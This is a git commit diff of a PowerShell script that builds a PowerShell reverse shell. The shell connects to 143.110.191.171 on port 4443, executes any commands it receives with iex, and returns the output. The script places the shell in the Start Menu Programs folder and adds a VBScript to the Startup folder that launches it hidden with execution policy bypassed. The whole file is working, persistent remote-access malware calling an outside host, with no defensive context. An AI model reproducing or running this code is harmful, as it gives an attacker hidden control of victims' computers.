3e0cf1fe8647abf04327c3a1af2cfcc2ac02cb48
tanishqDevx <tanishqjain000111@gmail.com>
2025-09-24 09:39:50 +0530

    Update code2.ps1

--- code2.ps1
+++ code2.ps1
@@ -1,20 +1,14 @@
+# Paths
 $programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
 $startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $ps1Path = Join-Path $programsPath "code2.ps1"
 $ps1Content = @'
 $sm = (New-Object Net.Sockets.TCPClient('143.110.191.171',4443)).GetStream()
 [byte[]]$bt = 0..65535 | % {0}
-while ($true) {
-    try {
-        while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
-            $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
-            $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
-            $sm.Write($st, 0, $st.Length)
-        }
-    } catch {
-        Start-Sleep -Seconds 300
-        $sm = (New-Object Net.Sockets.TCPClient('143.110.191.171',4443)).GetStream()
-    }
+while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
+   $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
+   $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
+   $sm.Write($st, 0, $st.Length)
 }
 '@
 
@@ -24,11 +18,19 @@ $vbsPath = Join-Path $startupPath "RunHidden.vbs"
 $vbsContent = @'
 Dim objShell
 Set objShell = CreateObject("Wscript.Shell")
+
+' Path to your PowerShell script
+psScript = "C:\Users\PRINCI\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\code2.ps1"
+
+' Command to run PowerShell hidden
 appData = objShell.ExpandEnvironmentStrings("%APPDATA%")
 psScript = appData & "\Microsoft\Windows\Start Menu\Programs\code2.ps1"
 cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"
+
+' 0 = hidden, False = don't wait
 objShell.Run cmd, 0, False
 '@
+
 
 Set-Content -Path $vbsPath -Value $vbsContent -Force
 $cscript = "cscript.exe //nologo `"$vbsPath`""
